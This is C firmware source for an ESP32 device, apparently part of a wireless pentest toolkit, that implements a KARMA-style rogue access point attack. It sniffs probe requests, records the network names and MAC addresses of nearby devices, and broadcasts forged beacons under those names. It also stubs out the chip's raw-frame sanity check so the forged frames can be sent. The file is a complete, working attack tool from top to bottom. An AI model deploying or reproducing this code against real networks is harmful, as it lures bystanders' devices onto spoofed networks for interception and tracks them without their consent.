/*
 * TheWave32 / wifi-ghost
 *
 * KARMA-style probe responder. Listens to probe-requests in promiscuous
 * mode, harvests the SSID names devices are looking for, and beacons
 * those SSIDs back so the device sees its saved network "in range".
 *
 * Single-task model: promisc cb learns SSIDs into a small dedup'd ring;
 * spammer task iterates the ring and emits one beacon per cycle. Same TX
 * frame layout as wifi-beacon-spam.
 */

#include <assert.h>
#include <inttypes.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "esp_event.h"
#include "esp_random.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"
#include "nvs_flash.h"

#include "tw32_cdc_cli.h"
#include "tw32_io.h"
#include "tw32_json_out.h"
#include "tw32_nvs_kv.h"

#define MODULE_NAME    "wifi-ghost"
#define MODULE_VERSION "0.2.0"

#define MAX_SSIDS     32
#define MIN_SSID_LEN  2     /* entropy gate: 1-char SSIDs are almost always noise */
#define MAX_SSID_LEN  32
#define BEACON_BUF_LEN 100
#define FC0_PROBE_REQ 0x40

/* 24 mgmt hdr + 12 fixed (ts/beacon-int/cap) + IE_SSID(2+32) + IE_RATES(2+4)
 * + IE_DSPARAM(2+1) = 81 bytes worst case. Static check protects against
 * accidental MAX_SSID_LEN bumps. */
_Static_assert(24 + 12 + 2 + MAX_SSID_LEN + 2 + 4 + 2 + 1 <= BEACON_BUF_LEN,
               "BEACON_BUF_LEN too small for worst-case ghost beacon");

int __wrap_ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c)
{ (void)a;(void)b;(void)c; return 0; }

typedef struct {
    char    ssid[MAX_SSID_LEN + 1];
    uint8_t len;
    uint8_t used;
} entry_t;

typedef struct {
    volatile bool     running;
    volatile uint8_t  channel;
    volatile uint32_t interval_ms;
    volatile int8_t   rssi_min;
    /* frames_sent (spammer task) and ssids_learned (RX callback) are read
     * unlocked by the CLI on another core: atomic so the access is defined. */
    _Atomic uint32_t  frames_sent;
    _Atomic uint32_t  ssids_learned;
    entry_t  ring[MAX_SSIDS];
    int      ring_pos;
    SemaphoreHandle_t lock;
} state_t;

static state_t s_state = { .channel = 1, .interval_ms = 100, .rssi_min = -127 };

#define LOCK()   xSemaphoreTake(s_state.lock, portMAX_DELAY)
#define UNLOCK() xSemaphoreGive(s_state.lock)

static bool ring_contains(const char *s, uint8_t L)
{
    for (int i = 0; i < MAX_SSIDS; i++) {
        if (s_state.ring[i].used &&
            s_state.ring[i].len == L &&
            memcmp(s_state.ring[i].ssid, s, L) == 0) return true;
    }
    return false;
}

static void ring_add(const char *s, uint8_t L)
{
    if (ring_contains(s, L)) return;
    /* Overwrite at ring_pos (FIFO). Write payload first, set `used` last so
     * any future lock-free reader cannot observe a slot flagged in-use with
     * stale len/ssid. All current readers (spammer/stats/clear) take LOCK,
     * but the ordering is cheap insurance against future refactors. */
    int slot = s_state.ring_pos % MAX_SSIDS;
    s_state.ring[slot].len  = L;
    memcpy(s_state.ring[slot].ssid, s, L);
    s_state.ring[slot].ssid[L] = '\0';
    s_state.ring[slot].used = 1;
    s_state.ring_pos++;
    s_state.ssids_learned++;
}

static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_state.running) return;
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *fr = p->payload;
    uint16_t flen = p->rx_ctrl.sig_len;
    if (flen < 24 + 2) return;
    if (fr[0] != FC0_PROBE_REQ) return;
    if ((int8_t)p->rx_ctrl.rssi < s_state.rssi_min) return;

    /* SSID IE is the first IE after the 24-byte mgmt header (no fixed body
     * for probe-requests). */
    const uint8_t *ie = fr + 24;
    uint16_t avail = flen - 24;
    if (avail < 2) return;
    uint8_t id  = ie[0];
    uint8_t len = ie[1];
    if (id != 0 || len < MIN_SSID_LEN || len > MAX_SSID_LEN) return;
    if (2u + (uint16_t)len > avail) return;

    /* Entropy gate. Reject:
     *  - non-printable bytes (keeps TX clean and the JSON event valid)
     *  - all-space / all-control payloads (legacy phones broadcast junk
     *    when wifi is toggled and would otherwise fill the ring with
     *    indistinguishable noise; see Dai Zovi & Macaulay, KARMA, Black
     *    Hat USA 2005, on PNL leakage quality). */
    int printable_nonspace = 0;
    for (int i = 0; i < len; i++) {
        uint8_t b = ie[2 + i];
        if (b < 0x20 || b > 0x7e) return;
        if (b != 0x20) printable_nonspace++;
    }
    if (printable_nonspace == 0) return;

    char ssid_copy[MAX_SSID_LEN + 1];
    memcpy(ssid_copy, ie + 2, len);
    ssid_copy[len] = '\0';

    LOCK();
    bool was_present = ring_contains(ssid_copy, len);
    if (!was_present) ring_add(ssid_copy, len);
    UNLOCK();

    if (!was_present) {
        tw32_json_begin();
        tw32_json_kv_str("event", "learned");
        tw32_json_kv_str("ssid", ssid_copy);
        tw32_json_kv_int("rssi", p->rx_ctrl.rssi);
        tw32_json_kv_mac("src",  fr + 10);
        tw32_json_end();
    }
}

static void rand_bssid(uint8_t out[6])
{
    uint32_t r1 = esp_random();
    uint32_t r2 = esp_random();
    out[0] = (uint8_t)((r1 & 0xFC) | 0x02);
    out[1] = (uint8_t)(r1 >> 8);
    out[2] = (uint8_t)(r1 >> 16);
    out[3] = (uint8_t)r2;
    out[4] = (uint8_t)(r2 >> 8);
    out[5] = (uint8_t)(r2 >> 16);
}

static int build_beacon(uint8_t *buf, const entry_t *e, uint8_t channel,
                        uint16_t seq)
{
    int o = 0;
    buf[o++] = 0x80; buf[o++] = 0x00;
    buf[o++] = 0x00; buf[o++] = 0x00;
    memset(buf + o, 0xFF, 6); o += 6;
    uint8_t b[6]; rand_bssid(b);
    memcpy(buf + o, b, 6); o += 6;
    memcpy(buf + o, b, 6); o += 6;
    buf[o++] = (uint8_t)((seq & 0x0F) << 4);
    buf[o++] = (uint8_t)((seq >> 4) & 0xFF);
    memset(buf + o, 0, 8); o += 8;
    buf[o++] = 0x64; buf[o++] = 0x00;
    buf[o++] = 0x21; buf[o++] = 0x04;
    buf[o++] = 0x00; buf[o++] = e->len;
    memcpy(buf + o, e->ssid, e->len); o += e->len;
    buf[o++] = 0x01; buf[o++] = 0x04;
    buf[o++] = 0x82; buf[o++] = 0x84; buf[o++] = 0x8B; buf[o++] = 0x96;
    buf[o++] = 0x03; buf[o++] = 0x01; buf[o++] = channel;
    return o;
}

static void spammer_task(void *arg)
{
    (void)arg;
    static uint8_t buf[BEACON_BUF_LEN];
    uint16_t seq = 0;
    int idx = 0;
    while (true) {
        if (!s_state.running) {
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }
        entry_t snap;
        bool have = false;
        LOCK();
        for (int i = 0; i < MAX_SSIDS; i++) {
            int j = (idx + i) % MAX_SSIDS;
            if (s_state.ring[j].used) { snap = s_state.ring[j]; have = true; idx = (j + 1) % MAX_SSIDS; break; }
        }
        UNLOCK();
        if (!have) {
            vTaskDelay(pdMS_TO_TICKS(s_state.interval_ms));
            continue;
        }
        int len = build_beacon(buf, &snap, s_state.channel, seq++);
        if (esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false) == ESP_OK) {
            s_state.frames_sent++;
        }
        vTaskDelay(pdMS_TO_TICKS(s_state.interval_ms));
    }
}

static void wifi_init(void)
{
    { esp_err_t _e = esp_event_loop_create_default();
      if (_e != ESP_OK && _e != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(_e); }
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    esp_wifi_set_ps(WIFI_PS_NONE);
    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filt));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(&promisc_cb));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_set_channel(s_state.channel, WIFI_SECOND_CHAN_NONE));
}

/* --- CLI ---------------------------------------------------------------- */

static int cmd_start(tw32_cli_ctx_t *c, int argc, char **argv)
{ (void)c;(void)argc;(void)argv; s_state.running = true;  tw32_cli_ack_ok("start"); return 0; }

static int cmd_stop(tw32_cli_ctx_t *c, int argc, char **argv)
{ (void)c;(void)argc;(void)argv; s_state.running = false; tw32_cli_ack_ok("stop");  return 0; }

static int cmd_clear(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c; (void)argc; (void)argv;
    LOCK();
    memset(s_state.ring, 0, sizeof(s_state.ring));
    s_state.ring_pos = 0;
    UNLOCK();
    tw32_cli_ack_ok("clear");
    return 0;
}

static int cmd_min_rssi(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("min_rssi", "missing_arg"); return -1; }
    long v = strtol(argv[1], NULL, 10);
    if (v < -127 || v > 0) { tw32_cli_ack_err("min_rssi", "out_of_range"); return -1; }
    s_state.rssi_min = (int8_t)v;
    tw32_cli_ack_ok("min_rssi");
    return 0;
}

static int cmd_interval(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("interval", "missing_arg"); return -1; }
    long ms = strtol(argv[1], NULL, 10);
    if (ms < 50 || ms > 2000) { tw32_cli_ack_err("interval", "out_of_range"); return -1; }
    s_state.interval_ms = (uint32_t)ms;
    tw32_cli_ack_ok("interval");
    return 0;
}

static int cmd_chan(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("chan", "missing_arg"); return -1; }
    long ch = strtol(argv[1], NULL, 10);
    if (ch < 1 || ch > 14) { tw32_cli_ack_err("chan", "out_of_range"); return -1; }
    if (esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        tw32_cli_ack_err("chan", "set_failed"); return -1;
    }
    s_state.channel = (uint8_t)ch;
    tw32_cli_ack_ok("chan");
    return 0;
}

static int cmd_stats(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c; (void)argc; (void)argv;
    int populated = 0;
    LOCK();
    for (int i = 0; i < MAX_SSIDS; i++) if (s_state.ring[i].used) populated++;
    UNLOCK();
    tw32_json_begin();
    tw32_json_kv_str ("cmd", "stats");
    tw32_json_kv_bool("ok", true);
    tw32_json_kv_uint("frames_sent",   s_state.frames_sent);
    tw32_json_kv_uint("ssids_learned", s_state.ssids_learned);
    tw32_json_kv_int ("ssids_active",  populated);
    tw32_json_kv_int ("rssi_min",      s_state.rssi_min);
    tw32_json_kv_uint("interval_ms",   s_state.interval_ms);
    tw32_json_kv_int ("channel",       s_state.channel);
    tw32_json_kv_bool("running",       s_state.running);
    tw32_json_end();
    return 0;
}

static const tw32_cli_cmd_t cli_table[] = {
    { "start",    "begin learning + responding", cmd_start    },
    { "stop",     "halt",                        cmd_stop     },
    { "clear",    "purge learned SSID ring",     cmd_clear    },
    { "min_rssi", "min_rssi N (-127..0)",        cmd_min_rssi },
    { "interval", "interval N (50..2000 ms)",    cmd_interval },
    { "chan",     "chan N (1..14)",              cmd_chan     },
    { "stats",    "frames + state",              cmd_stats    },
};

void app_main(void)
{
    tw32_nvs_init();
    tw32_cdc_init();
    s_state.lock = xSemaphoreCreateMutex();
    configASSERT(s_state.lock);
    wifi_init();
    xTaskCreatePinnedToCore(spammer_task, "tw32-ghost", 4096, NULL, 4, NULL, 1);
    tw32_cli_run(MODULE_NAME, MODULE_VERSION,
                 cli_table, sizeof(cli_table) / sizeof(cli_table[0]));
}
